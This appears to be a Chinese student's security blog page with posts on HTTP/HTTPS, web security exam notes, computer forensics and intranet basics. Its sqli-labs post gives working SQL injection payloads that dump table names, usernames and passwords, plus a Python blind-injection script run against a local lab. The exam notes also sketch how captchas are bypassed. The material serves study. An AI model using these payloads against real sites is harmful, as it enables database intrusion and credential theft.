<p><code>Content-Type</code>指示响应的内容，这里是<code>text/html</code>表示HTML网页。</p>
<p><strong>请注意，浏览器就是依靠<code>Content-Type</code>来判断响应的内容是网页还是图片，是视频还是音乐。</strong></p>
<p>浏览器并不靠URL来判断响应的内容，所以，即使URL是<code>http://example.com/abc.jpg</code>，它也不一定就是图片。</p>
<h4 id="—-常用的HTTP方法有哪些？"><a href="#—-常用的HTTP方法有哪些？" class="headerlink" title="—-常用的HTTP方法有哪些？"></a>—-常用的HTTP方法有哪些？</h4><p>GET： 用于请求访问已经被URI（统一资源标识符）识别的资源，可以通过URL传参给服务器<br>POST：用于传输信息给服务器，主要功能与GET方法类似，但一般推荐使用POST方式。<br>PUT： 传输文件，报文主体中包含文件内容，保存到对应URI位置。<br>HEAD： 获得报文首部，与GET方法类似，只是不返回报文主体，一般用于验证URI是否有效。<br>DELETE：删除文件，与PUT方法相反，删除对应URI位置的文件。<br>OPTIONS：查询相应URI支持的HTTP方法。</p>
<h4 id="—-HTTP请求过程"><a href="#—-HTTP请求过程" class="headerlink" title="—-HTTP请求过程"></a><strong>—-HTTP请求过程</strong></h4><p><strong>步骤1：浏览器首先向服务器发送HTTP请求，请求包括：</strong></p>
<p>方法：<code>GET</code>还是<code>POST</code>，<code>GET</code>仅请求资源，<code>POST</code>会附带用户数据；</p>
<p>路径：<code>/full/url/path</code>；</p>
<p>域名：由Host头指定：<code>Host: www.sina.com.cn</code></p>
<p>以及其他相关的Header；</p>
<p>如果是POST，那么请求还包括一个Body，包含用户数据。</p>
<p><strong>步骤2：服务器向浏览器返回HTTP响应，响应包括：</strong></p>
<p>响应代码：<code>200</code>表示成功，<code>3xx</code>表示重定向( <strong>表示要完成请求，需要进一步操作</strong>)，<code>4xx</code>表示客户端发送的请求有错误，<code>5xx</code>表示服务器端处理时发生了错误；</p>
<p>响应类型：由<code>Content-Type</code>指定，例如：<code>Content-Type: text/html;charset=utf-8</code>表示响应类型是HTML文本，并且编码是<code>UTF-8</code>，<code>Content-Type: image/jpeg</code>表示响应类型是JPEG格式的图片；</p>
<p>以及其他相关的Header；</p>
<p>通常服务器的HTTP响应会携带内容，也就是有一个Body，包含响应的内容，网页的HTML源码就在Body中。</p>
<p><strong>步骤3：如果浏览器还需要继续向服务器请求其他资源，比如图片，就再次发出HTTP请求，重复步骤1、2</strong></p>
<p>Web采用的HTTP协议采用了非常简单的请求-响应模式，从而大大简化了开发。当我们编写一个页面时，我们只需要在HTTP响应中把HTML发送出去，不需要考虑如何附带图片、视频等，浏览器如果需要请求图片和视频，它会发送另一个HTTP请求，因此，一个HTTP请求只处理一个资源。</p>
<p>HTTP协议同时具备极强的扩展性，虽然浏览器请求的是<code>http://www.sina.com.cn/</code>的首页，但是新浪在HTML中可以链入其他服务器的资源，比如</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"http://i1.sinaimg.cn/home/2013/1008/U8455P30DT20131008135420.png"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>从而将请求压力分散到各个服务器上，并且，一个站点可以链接到其他站点，无数个站点互相链接起来，就形成了World Wide Web，简称“三达不溜”（WWW）。</p>
<h4 id="—-HTTP格式"><a href="#—-HTTP格式" class="headerlink" title="—-HTTP格式"></a>—-HTTP格式</h4><p>每个HTTP请求和响应都遵循相同的格式，一个HTTP包含Header和Body两部分，其中Body是可选的。</p>
<p>HTTP协议是一种文本协议，所以，它的格式也非常简单。HTTP GET请求的格式：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/path</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br></pre></td></tr></table></figure>

<p>每个Header一行一个，换行符是<code>\r\n</code>。</p>
<p>HTTP POST请求的格式：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/path</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br><span class="line"></span><br><span class="line">body data goes here...</span><br></pre></td></tr></table></figure>

<p>当遇到连续两个<code>\r\n</code>时，Header部分结束，后面的数据全部是Body。</p>
<p>HTTP响应的格式：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">200 OK</span><br><span class="line"><span class="attribute">Header1</span>: Value1</span><br><span class="line"><span class="attribute">Header2</span>: Value2</span><br><span class="line"><span class="attribute">Header3</span>: Value3</span><br><span class="line"></span><br><span class="line">body data goes here...</span><br></pre></td></tr></table></figure>

<p>HTTP响应如果包含body，也是通过<code>\r\n\r\n</code>来分隔的。请再次注意，Body的数据类型由<code>Content-Type</code>头来确定，如果是网页，Body就是文本，如果是图片，Body就是图片的二进制数据。</p>
<p>当存在<code>Content-Encoding</code>时，Body数据是被压缩的，最常见的压缩方式是gzip，所以，看到<code>Content-Encoding: gzip</code>时，需要将Body数据先解压缩，才能得到真正的数据。压缩的目的在于减少Body的大小，加快网络传输。</p>
<h4 id="2-HTTPS的基本概念"><a href="#2-HTTPS的基本概念" class="headerlink" title="2.HTTPS的基本概念"></a>2.HTTPS的基本概念</h4><h4 id="—-原理"><a href="#—-原理" class="headerlink" title="—-原理"></a><strong>—-原理</strong></h4><p> Https：是以安全为目标的Http通道，是Http的安全版。Https的安全基础是SSL。SSL协议位于<a href="https://baike.baidu.com/item/TCP/IP协议" target="_blank" rel="noopener">TCP/IP协议</a>与各种应用层协议之间，为<a href="https://baike.baidu.com/item/数据通讯" target="_blank" rel="noopener">数据通讯</a>提供安全支持。SSL协议可分为两层：SSL记录协议（SSL Record Protocol），它建立在可靠的传输协议（如TCP）之上，为高层协议提供<a href="https://baike.baidu.com/item/数据封装" target="_blank" rel="noopener">数据封装</a>、压缩、加密等基本功能的支持。SSL握手协议（SSL Handshake Protocol），它建立在SSL记录协议之上，用于在实际的数据传输开始前，通讯双方进行身份认证、协商加密算法、交换加密密钥等。</p>
<p><strong>Https设计目标：</strong></p>
<p>(1)数据保密性：保证数据内容在传输的过程中不会被第三方查看。就像快递员传递包裹一样，都进行了封装，别人无法获知里面装了什么 。</p>
<p>(2)数据完整性：及时发现被第三方篡改的传输内容。就像快递员虽然不知道包裹里装了什么东西，但他有可能中途掉包，数据完整性就是指如果被掉包，我们能轻松发现并拒收 。</p>
<p>(3)身份校验安全性：保证数据到达用户期望的目的地。就像我们邮寄包裹时，虽然是一个封装好的未掉包的包裹，但必须确定这个包裹不会送错地方，通过身份校验来确保送对了地方 。</p>
<p><strong>Https原理：</strong></p>
<p>① 客户端将它所支持的算法列表和一个用作产生密钥的随机数发送给服务器；</p>
<p>② 服务器从算法列表中选择一种加密算法，并将它和一份包含<a href="https://baike.baidu.com/item/服务器/100571" target="_blank" rel="noopener">服务器</a>公用密钥的证书发送给<a href="https://baike.baidu.com/item/客户端/101081" target="_blank" rel="noopener">客户端</a>；该证书还包含了用于认证目的的服务器标识，服务器同时还提供了一个用作产生密钥的随机数；</p>
<p>③ 客户端对服务器的证书进行验证（有关验证证书，可以参考<a href="https://baike.baidu.com/item/数字签名/212550" target="_blank" rel="noopener">数字签名</a>），并抽取服务器的公用密钥；然后，再产生一个称作 pre_master_secret 的随机密码串，并使用服务器的公用密钥对其进行加密（参考非对称加 / 解密），并将加密后的信息发送给服务器；</p>
<p>④ 客户端与服务器端根据 pre_master_secret 以及客户端与服务器的随机数值独立计算出加密和 <a href="https://baike.baidu.com/item/MAC/173" target="_blank" rel="noopener">MAC</a>密钥（参考 DH密钥交换算法） ；</p>
<p>⑤ 客户端将所有握手消息的 MAC 值发送给服务器；</p>
<p>⑥ 服务器将所有握手消息的 MAC 值发送给客户端。</p>
<h4 id="3-HTTP与HTTPS的区别"><a href="#3-HTTP与HTTPS的区别" class="headerlink" title="3.HTTP与HTTPS的区别"></a><strong>3.HTTP与HTTPS的区别</strong></h4><p>1、<strong>https协议需要到CA</strong> （Certificate Authority，证书颁发机构）申请证书，一般免费证书较少，因而需要一定费用。(原来网易官网是http，而网易邮箱是https。)</p>
<p>2、http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议。</p>
<p>3、http和https使用的是完全不同的连接方式，用的端口也不一样，<strong>前者是80，后者是443</strong>。</p>
<p>4、http的连接很简单，是无状态的。Https协议是由SSL+Http协议构建的可进行<strong>加密传输、身份认证</strong>的网络协议，比http协议安全。(<strong>无状态的意思是其数据包的发送、传输和接收都是相互独立的</strong>。无连接的意思是指通信双方都不长久的维持对方的任何信息。)</p>
<h4 id="—-HTTPS的缺点（对比优点）"><a href="#—-HTTPS的缺点（对比优点）" class="headerlink" title="—-HTTPS的缺点（对比优点）"></a><strong>—-HTTPS的缺点（对比优点）</strong></h4><p>1、Https协议握手阶段比较费时，会使页面的加载时间延长。</p>
<p>2、Https连接缓存不如Http高效，会增加数据开销，甚至已有的安全措施也会因此而受到影响。</p>
<p>3、<strong>Https协议的安全是有范围的，在黑客攻击、拒绝服务攻击和服务器劫持</strong>等方面几乎<strong>起不到什么作用</strong>。</p>
<p>4、<strong>SSL证书通常需要绑定IP，不能在同一IP上绑定多个域名</strong>，IPv4资源不可能支撑这个消耗。</p>
<p>5、成本增加。部署 Https后，因为 Https协议的工作要增加额外的计算资源消耗，例如 <strong>SSL 协议加密算法和 SSL 交互次数将占用一定的计算资源和服务器成本</strong>。</p>
<p>6、Https协议的<strong>加密范围也比较有限</strong>。最关键的，SSL证书的信用链体系并不安全，特别是在某些国家可以控制CA根证书的情况下，中间人攻击一样可行。</p>
<h4 id="—-HTTP1-1版本新特性"><a href="#—-HTTP1-1版本新特性" class="headerlink" title="—-HTTP1.1版本新特性"></a>—-HTTP1.1版本新特性</h4><p>a、默认持久连接节省通信量，只要客户端服务端任意一端没有明确提出断开TCP连接，就一直保持连接，可以发送多次HTTP请求</p>
<p>b、管线化，客户端<strong>可以同时发出多个HTTP请求</strong>，而不用一个个等待响应</p>
<p>c、<strong>断点续传原理</strong></p>
<h4 id="—-HTTP的缺点与HTTPS"><a href="#—-HTTP的缺点与HTTPS" class="headerlink" title="—-HTTP的缺点与HTTPS"></a>—-HTTP的缺点与HTTPS</h4><p>a、通信使用明文不加密，内容可能被窃听<br>b、不验证通信方身份，可能遭到伪装<br>c、无法验证报文完整性，可能被篡改</p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-php" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/06/11/php/"
    >php</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/06/11/php/" class="article-date">
  <time datetime="2020-06-11T06:28:21.000Z" itemprop="datePublished">2020-06-11</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <p>考试内容：</p>
<h3 id="web服务器端安全保护措施："><a href="#web服务器端安全保护措施：" class="headerlink" title="web服务器端安全保护措施："></a><strong>web服务器端安全保护措施：</strong></h3><p>1.更改服务器远程端口，默认端口为80，相对来讲不太安全，建议改为随机的5位数端口。<br>2.设置防火墙并关闭不需要的服务和端口。<br>3.定时为数据进行备份。<br>4.把密码设置的复杂一点（防止黑客暴力破解）<br>5.修补已知的漏洞(即时打补丁)<br>6.可以上传的目录不给执行权限，可以执行的目录不给上传权限(防止入侵者通过上传获得webshell)<br>7.降低数据库连接帐户SA的权限，使用public最安全，这样入侵者只能通过猜解用户名和密码来获得webshell</p>
<p>禁止系统文件被非法修改、禁止非法提权操作、禁止恶意代码执行、</p>
<p>禁止加载没有数字签名的驱动、优化系统配置及服务等</p>
<h3 id="web浏览器端采取安全措施"><a href="#web浏览器端采取安全措施" class="headerlink" title="web浏览器端采取安全措施"></a><strong>web浏览器端采取安全措施</strong></h3><p><strong>浏览器的安全机制包括 网页安全模型 和 沙箱模型</strong></p>
<p><strong>1.开启同源策略</strong></p>
<p><strong>2.开启CSP策略</strong></p>
<p>以白名单的形式配置可信任的内容来源在网页中,能够使白名单中的内容正常执行(包含Js,CSS, Image等等)而非白名单的内容无法正常执行,从而减少跨站脚本攻击(XSS)当然,也能够减少运营商劫持的内容注入攻击</p>
<p><strong>3.创建沙箱模型</strong></p>
<p>而沙箱模型则是利用了 Chromium 实现的，利用 代理进程 来创建独立的环境让 目标进程 在当中安全运行。</p>
<p><strong>4.加强cookie防护</strong></p>
<p>定期清理cookie，不在cookie中存放敏感信息，<strong>使用session和cookie双重验证</strong>，增加登录随机验证码，</p>
<p>设置HttpOnly, 如果设置该属性，客户端javascript无法获取Cookie的值</p>
<p><strong>5.安装补丁及配置安全设置</strong></p>
<p>禁止javascript脚本、ActiveX的运行</p>
<p><strong>6.使用安全通信协议</strong></p>
<p>使用HTTPS协议进行通信，保证数据传输的安全。</p>
<p><strong>常见的web安全威胁（OWASP top 10 2017）：</strong></p>
<p>1.注入攻击（主要分为SQL注入和命令执行）:攻击者在输入数据时向解释器提交一些非法或者未授权的命令来欺骗解释权，使解释器错误的执行了这些代码，向攻击者返回一些本不应该被看见的数据</p>
<p>2.失效的身份认证和会话管理</p>
<p>3.敏感数据泄露</p>
<p>4.XML外部实体（XXE）</p>
<p>5.失效的访问控制</p>
<p>6.安全配置错误</p>
<p>7.跨站脚本（XSS）</p>
<p>8.不安全的反序列化</p>
<p>9.使用含有已知漏洞的组件</p>
<p>10.不足的日志记录和监控</p>
<p><strong>常见的注入、xss、csrf、文件上传原理（类型，步骤，危害，防范）：</strong></p>
<h4 id="—-GET方法与POST方法的区别"><a href="#—-GET方法与POST方法的区别" class="headerlink" title="—-GET方法与POST方法的区别"></a>—-GET方法与POST方法的区别</h4><p>区别一：<br>get重点在从服务器上获取 资源，post重点在向服务器发送数据；<br>区别二：<br>get传输数据是通过URL请求，以field（字段）= value的形式，置于URL后，并用”?”连接，<strong>多个请求数据间用”&amp;”连接</strong>，如<a href="http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；" target="_blank" rel="noopener">http://127.0.0.1/Test/login.action?name=admin&amp;password=admin，这个过程用户是可见的；</a><br>post传输数据通过Http的post机制，将字段与对应值封存在请求实体中发送给服务器，这个过程对用户是不可见的；<br>区别三：<br>Get传输的数据量小，因为受URL长度限制，但效率较高；<br><strong>Post可以传输大量数据，所以上传文件时只能用Post方式</strong>；<br>区别四：<br>get是不安全的，因为URL是可见的，可能会泄露私密信息，如密码等；<br>post较get安全性较高；<br>区别五：<br>get方式只能支持ASCII字符，向服务器传的中文字符可能会乱码。<br><strong>post支持标准字符集，可以正确传递中文字符</strong>。</p>
<h3 id="网页验证码技术有哪几种，特点，怎么攻破？"><a href="#网页验证码技术有哪几种，特点，怎么攻破？" class="headerlink" title="网页验证码技术有哪几种，特点，怎么攻破？"></a><strong>网页验证码技术有哪几种，特点，怎么攻破？</strong></h3><p>总的来讲，可以大致划分为三类：</p>
<p><strong>1.字符型验证码：**</strong>常见的数字字母混合验证**</p>
<p><strong>2.图片型验证码：滑动验证码、识别图片物体型、旋转图片型、点触验证码</strong></p>
<p><strong>3.智能型：计算题验证码、语音验证码、短信验证码</strong></p>
<p>特点：</p>
<p><strong>字符型验证码：由各种复杂的字母数字组合而成，且验证码背景有线条干扰或大量小点分布</strong></p>
<p>对于这类验证码，一般的步骤是，先爬取验证码图片到本地，随后对验证码进行识别，识别验证码一般采用OCR技术，即字符识别技术，为了提高识别的准确度，我们会先对图片进行灰度化，再进行二值化，这样识别的准确度会大大提高。也可利用第三方平台的接口，进行破解。</p>
<p><strong>图片型验证码：像图片识别类的验证码的特点主要是复杂，机器辨识度低，机器可替代性弱。</strong></p>
<p>但是现在一样可以做到攻破这类验证码，比如滑动验证码，将背景图、滑块图保存到本地，对比两张图片的位置信息，然后确度滑块位置，利用selenium模块下的函数，模拟点击滑块进行滑动，即可绕过。</p>
<p><strong>智能型验证码：特点主要在于难度高，机器识别困难。</strong></p>
<p>对于这一类可以利用cookie登录，利用cookie的特性：cookie会保持较长的时间，来避免用户频繁登录。</p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-sqli-labs" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/05/19/sqli-labs/"
    >sqli-labs</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/05/19/sqli-labs/" class="article-date">
  <time datetime="2020-05-19T03:57:08.000Z" itemprop="datePublished">2020-05-19</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>知识点：</p>
<p>这题可采用报错注入，updatexml（1，xxx，1） 或者 extractvalue（1，x）</p>
<p>extractvalue(目标xml文档，xml路径)</p>
<p>updatexml(目标xml文档，xml路径，更新的内容)</p>
<p>group_concat():可将相同行的字段整合在一起</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#爆库</span></span><br><span class="line">?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1                                      </span><br><span class="line"></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line">?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e),1)  and '1</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆列</span></span><br><span class="line">?id=1' and updatexml(1,(select group_concat(0x7e,column_name,0x7e) from information_schema.columns where table_name='users') ,0x7e)  and '1</span><br><span class="line"></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line">?id=1' and updatexml(1,(select group_concat(id,0x7e,username,0x7e,password)from users),1) and '1</span><br><span class="line"><span class="comment">#回显不全，可改为concat---limit 0,1 进行逐个查询</span></span><br><span class="line">?id=1' and updatexml(1,(select concat(id,0x7e,username,0x7e,password) from users limit 4,1),1) and '1</span><br></pre></td></tr></table></figure>



<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>和上一关一样，只不过把单引号变成双引号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot; and updatexml(1,concat(0x7e,database(),0x7e),1)  and &quot;1</span><br></pre></td></tr></table></figure>



<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>这里用了双括号括起来，如 $sql=”SELECT * FROM users WHERE id=((‘$id’))”  LIMIT 0,1”;</p>
<p>所以构造语句 ? id =1 ‘ ))  –+  顺利通过验证</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,3 into outfile &quot;&#x2F;var&#x2F;www&#x2F;sqli-labs&#x2F;Less-7&#x2F;uuu.txt&quot; --+</span><br></pre></td></tr></table></figure>



<p>{0}代表数据库的第几位<br>{1}代表acsii码的数值</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Length（）函数 返回字符串的长度</span><br><span class="line">Substr（）截取字符串</span><br><span class="line">Ascii（）返回字符的ascii码</span><br><span class="line">sleep(n)：将程序挂起一段时间 n为n秒</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_db_name</span><span class="params">()</span>:</span></span><br><span class="line">    result = <span class="string">""</span></span><br><span class="line">    url_template = <span class="string">"http://127.0.0.1:8080/Less-8/?id=1' and ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125; %23"</span></span><br><span class="line">    chars = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">    <span class="keyword">for</span> i  <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">            char_ascii = ord(char)</span><br><span class="line">            url = url_template.format(i,char_ascii) <span class="comment">#分别对应url的&#123;0&#125;、&#123;1&#125;</span></span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            length = len(response.text) </span><br><span class="line">            <span class="comment">#返回的长度只有706和722</span></span><br><span class="line">            <span class="keyword">if</span> length&gt;<span class="number">706</span>:</span><br><span class="line">                result += char</span><br><span class="line">                print(length,char,char_ascii)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(result)</span><br><span class="line">get_db_name()</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">722</span> s <span class="number">115</span></span><br><span class="line"><span class="number">722</span> e <span class="number">101</span></span><br><span class="line"><span class="number">722</span> c <span class="number">99</span></span><br><span class="line"><span class="number">722</span> u <span class="number">117</span></span><br><span class="line"><span class="number">722</span> r <span class="number">114</span></span><br><span class="line"><span class="number">722</span> i <span class="number">105</span></span><br><span class="line"><span class="number">722</span> t <span class="number">116</span></span><br><span class="line"><span class="number">722</span> y <span class="number">121</span></span><br><span class="line">security</span><br></pre></td></tr></table></figure>






      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-Forensics" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/26/Forensics/"
    >Computer Forensics</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/26/Forensics/" class="article-date">
  <time datetime="2020-04-26T05:10:03.000Z" itemprop="datePublished">2020-04-26</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <h2 id="文件系统取证"><a href="#文件系统取证" class="headerlink" title="文件系统取证"></a><strong>文件系统取证</strong></h2><p>课程要求：</p>
<p>了解：计算机启动过程、硬盘结构。</p>
<p>掌握：<strong>FAT文件系统</strong>取证、FAT取证实例、<strong>NTFS文件系统</strong>取证、NTFS取证实例。</p>
<p>英文单词：</p>
<p>clusters: 簇，最小单位</p>
<p>操作系统规定<strong>一个簇中只能放置一个文件的内容</strong>，因此文件所占用的空间，只能是簇的整数倍；如果文件实际大小小于一簇，它也要占一簇的空间。如果文件实际大小大于一簇，根据逻辑推算，那么该文件就要占两个簇的空间。所以，一般情况下文件所占空间要略大于文件的实际大小，只有在少数情况下，即文件的实际大小恰好是簇的整数倍时，文件的实际大小才会与所占空间完全一致。</p>
<p>1.分区表MBR</p>
<p>4个分区表中包含哪些信息</p>
<p>—分区的类型、状态、大小、起始地址、结束地址等等</p>
<p>，内容</p>
<p>2.创建、删除、恢复（在FAT\NTFS)</p>
<p><strong>2.FAT</strong></p>
<p><strong>3.NTFS</strong></p>
<p>每一个文件的头部、38表示</p>
<p>10表示-基本信息属性、30-名字属性、对应位置</p>
<p>常驻属性和非常驻属性</p>
<p>FAT – File Allocation Table （文件分配表）</p>
<p>NTFS – New Technology File System （新技术文件系统）</p>
<p>FAT删除</p>
<p>1.文件名开头以  HEX E5 </p>
<p>2.删除相应的簇链，簇链设置为0</p>
<p>3.最后4个字节是 0A 00  代表文件大小</p>
<p>再往前的 51 00  代表簇号</p>

      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      

    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-渗透实战学习" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/04/23/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/"
    >渗透实战学习</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/04/23/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98%E5%AD%A6%E4%B9%A0/" class="article-date">
  <time datetime="2020-04-23T07:13:23.000Z" itemprop="datePublished">2020-04-23</time>
</a>
      
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E4%B9%8B%E8%B7%AF/">渗透之路</a>
  </div>

      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <hr>
<p>光看书不动手是无法更深刻理解的，一开始还是跟着大佬的步骤走，再自己复现一遍，尽可能搞懂每一步！</p>
<h2 id="1-内网基础知识"><a href="#1-内网基础知识" class="headerlink" title="1.内网基础知识"></a>1.内网基础知识</h2><p><strong>工作组：</strong>在工作组中的网络可以互相访问对方的共享资源，主要按部门或者功能进行分组</p>
<p><strong>域（Domain）：</strong>是一个有安全边界的计算机集合，可以理解为升级版的工作组，但域的安全管理控制机制更加严格。用户必须以合法的身份登录域，且用户的权限是根据用户在域中的身份决定的。</p>
<p><strong>域控制器（DC）：</strong>可以理解为一个单位的门禁系统，负责所有连入的计算机和用户的验证工作</p>
<p>域控制器存在这个域所有账户、密码等信息的数据库</p>
<p>域中一般有以下几个环境：</p>
<p><strong>单域：</strong>在一个地理位置固定的小公司，建立一个域就可以了。一般一个域至少两台域服务器，一个作为DC，另一台作为备份DC。</p>
<p>父域和子域：第一个创建的域为父域，各分部的域称为该域的子域。例如一个大公司的各个分公司位于不同的地点，就需要用到父域和子域。因为在同一个域当中，信息交互是比较多的，而且不能压缩。而不同域信息交互比较少，而且可以压缩。同时也为了安全考虑，每个域都有自己的安全策略，比如财务部希望使用特定的安全策略（包括账号密码策略）</p>
<p><strong>域树：</strong>是多个域通过建立信任关系组成的集合</p>
<p>（父）abc.com —-asia.abc.com ——cn.asia.abc.com（子）</p>
<p>abc.com—–europe.abc.com—–ft.asia.abc.com</p>
<p>子域只能使用父域的名字作为其域名的后缀</p>
<p><strong>域森林：</strong>多个域树建立信任关系组成的集合</p>
<p>比如abc.com要合并abc.net，但无法挂下，所以需要建立信任关系来构成</p>
<p><strong>域名服务器（Domain Name Server，DNS）：</strong>是指用于实现域名和与之相对应的IP地址转换的服务器</p>
<p>域树的域名和DNS域名非常相似，实际上，因为域中的计算机是使用DNS来定位域控制器、服务器以及其他计算机、网络服务的，所以域的名字就是DNS域的名字。</p>
<p><strong>在内网渗透中，大部分是通过寻找DNS服务器来确定域控制器的位置（这两者通常配值在一台机子上）</strong></p>
<p><strong>活动目录：</strong>是指域环境中提供目录服务的组件</p>
<p>域服务器和活动目录的区别：</p>
<p><strong>安全域的划分：</strong>划分安全域的目的是将安全等级相同的计算机划入同一网段，该网段的计算机拥有相同的网络边界，并在网络边界部署防火墙实现对其它安全域的网络访问控制策略。</p>
<p><strong>安全域一般分为DMZ和内网</strong></p>
<p>在一个用路由器连接的内网中，分为安全级别最高的内网、中等的DMZ、最低的外网。三个区域任务不同，访问策略不同</p>
<p><strong>DMZ称为隔离区</strong>，位于企业内部网络和外部网络之间。可以在其中放一些必须空开的服务器，如FTP、Web、论坛服务器</p>
<p>在网络边界上一般会部署防火墙及入侵检测等，如果有Web应用还会设置WAF，从而有效保护内网。</p>
<p>在配置一个拥有DMZ的网络时，通常需要定义如下访问控制策略，以实现屏障功能：</p>
<p><strong>1.内网可以访问外网：</strong>在这一策略中，防火墙需要执行NAT</p>
